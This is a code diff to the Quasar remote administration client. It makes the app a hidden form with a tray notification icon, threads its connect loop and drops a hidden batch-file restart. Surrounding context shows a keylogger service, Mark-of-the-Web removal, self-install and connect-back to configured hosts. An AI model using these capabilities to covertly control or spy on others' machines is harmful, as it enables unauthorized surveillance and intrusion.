@@ -1,5 +1,4 @@
 ﻿using Quasar.Client.Config;
-using Quasar.Client.IO;
 using Quasar.Client.Logging;
 using Quasar.Client.Messages;
 using Quasar.Client.Networking;
@@ -12,6 +11,9 @@ using Quasar.Common.Messages;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
+using System.Reflection;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace Quasar.Client
@@ -19,7 +21,7 @@ namespace Quasar.Client
     /// <summary>
     /// The client application which handles basic bootstrapping of the message processors and background tasks.
     /// </summary>
-    public class QuasarApplication : IDisposable
+    public class QuasarApplication : Form
     {
         /// <summary>
         /// A system-wide mutex that ensures that only one instance runs at a time.
@@ -52,12 +54,47 @@ namespace Quasar.Client
         private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;
 
         /// <summary>
+        /// Notification icon used to show notifications in the taskbar.
+        /// </summary>
+        private readonly NotifyIcon _notifyIcon;
+
+        /// <summary>
         /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
         /// </summary>
         public QuasarApplication()
         {
-            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
             _messageProcessors = new List<IMessageProcessor>();
+            _notifyIcon = new NotifyIcon();
+        }
+
+        /// <summary>
+        /// Starts the application.
+        /// </summary>
+        /// <param name="e">An System.EventArgs that contains the event data.</param>
+        protected override void OnLoad(EventArgs e)
+        {
+            Visible = false;
+            ShowInTaskbar = false;
+            Run();
+            base.OnLoad(e);
+        }
+
+        /// <summary>
+        /// Initializes the notification icon.
+        /// </summary>
+        private void InitializeNotifyicon()
+        {
+            _notifyIcon.Text = "Quasar Client\nNo connection";
+            _notifyIcon.Visible = true;
+            try
+            {
+                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex);
+                _notifyIcon.Icon = SystemIcons.Application;
+            }
         }
 
         /// <summary>
@@ -66,12 +103,14 @@ namespace Quasar.Client
         public void Run()
         {
             // decrypt and verify the settings
-            if (!Settings.Initialize()) return;
+            if (!Settings.Initialize())
+                Application.Exit();
 
             ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
 
             // check if process with same mutex is already running on system
-            if (!ApplicationMutex.CreatedNew) return;
+            if (!ApplicationMutex.CreatedNew)
+                Application.Exit();
 
             FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
 
@@ -85,6 +124,7 @@ namespace Quasar.Client
                 try
                 {
                     installer.Install();
+                    Application.Exit();
                 }
                 catch (Exception e)
                 {
@@ -103,6 +143,9 @@ namespace Quasar.Client
                     Debug.WriteLine(e);
                 }
 
+                if (!Settings.UNATTENDEDMODE)
+                    InitializeNotifyicon();
+
                 if (Settings.ENABLELOGGER)
                 {
                     _keyloggerService = new KeyloggerService();
@@ -111,52 +154,35 @@ namespace Quasar.Client
 
                 var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                 _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
+                _connectClient.ClientState += ConnectClientOnClientState;
                 InitializeMessageProcessors(_connectClient);
 
                 _userActivityDetection = new ActivityDetection(_connectClient);
                 _userActivityDetection.Start();
 
-                _connectClient.ConnectLoop();
+                new Thread(() =>
+                {
+                    // Start connection loop on new thread and dispose application once client exits.
+                    // This is required to keep the UI thread responsive and run the message loop.
+                    _connectClient.ConnectLoop();
+                    Application.Exit();
+                }).Start();
             }
         }
 
-        /// <summary>
-        /// Handles unhandled exceptions by restarting the application and hoping that they don't happen again.
-        /// </summary>
-        /// <param name="sender">The source of the unhandled exception event.</param>
-        /// <param name="e">The exception event arguments. </param>
-        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
+        private void ConnectClientOnClientState(Networking.Client s, bool connected)
         {
-            if (e.IsTerminating)
-            {
-                Debug.WriteLine(e);
-                try
-                {
-                    string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
-
-                    ProcessStartInfo startInfo = new ProcessStartInfo
-                    {
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        UseShellExecute = true,
-                        FileName = batchFile
-                    };
-                    Process.Start(startInfo);
-                }
-                catch (Exception exception)
-                {
-                    Debug.WriteLine(exception);
-                }
-                finally
-                {
-                    Environment.Exit(0);
-                }
-            }
+            if (connected)
+                _notifyIcon.Text = "Quasar Client\nConnection established";
+            else
+                _notifyIcon.Text = "Quasar Client\nNo connection";
         }
 
         /// <summary>
         /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
         /// </summary>
         /// <param name="client">The client which handles the connection.</param>
+        /// <remarks>Always initialize from UI thread.</remarks>
         private void InitializeMessageProcessors(QuasarClient client)
         {
             _messageProcessors.Add(new ClientServicesHandler(this, client));
@@ -176,7 +202,11 @@ namespace Quasar.Client
             _messageProcessors.Add(new WebsiteVisitorHandler());
 
             foreach (var msgProc in _messageProcessors)
+            {
                 MessageHandler.Register(msgProc);
+                if (msgProc is NotificationMessageProcessor notifyMsgProc)
+                    notifyMsgProc.ProgressChanged += ShowNotification;
+            }
         }
 
         /// <summary>
@@ -187,25 +217,22 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Unregister(msgProc);
+                if (msgProc is NotificationMessageProcessor notifyMsgProc)
+                    notifyMsgProc.ProgressChanged -= ShowNotification;
                 if (msgProc is IDisposable disposableMsgProc)
                     disposableMsgProc.Dispose();
             }
         }
 
-        /// <summary>
-        /// Releases all resources used by this <see cref="QuasarApplication"/>.
-        /// </summary>
-        public void Dispose()
+        private void ShowNotification(object sender, string value)
         {
-            Dispose(true);
-            GC.SuppressFinalize(this);
+            if (Settings.UNATTENDEDMODE)
+                return;
+            
+            _notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
         }
 
-        /// <summary>
-        /// Releases all allocated message processors, services and other resources.
-        /// </summary>
-        /// <param name="disposing"><c>True</c> if called from <see cref="Dispose"/>, <c>false</c> if called from the finalizer.</param>
-        protected virtual void Dispose(bool disposing)
+        protected override void Dispose(bool disposing)
         {
             if (disposing)
             {
@@ -214,7 +241,10 @@ namespace Quasar.Client
                 _userActivityDetection?.Dispose();
                 ApplicationMutex?.Dispose();
                 _connectClient?.Dispose();
+                _notifyIcon.Visible = false;
+                _notifyIcon.Dispose();
             }
+            base.Dispose(disposing);
         }
     }
 }
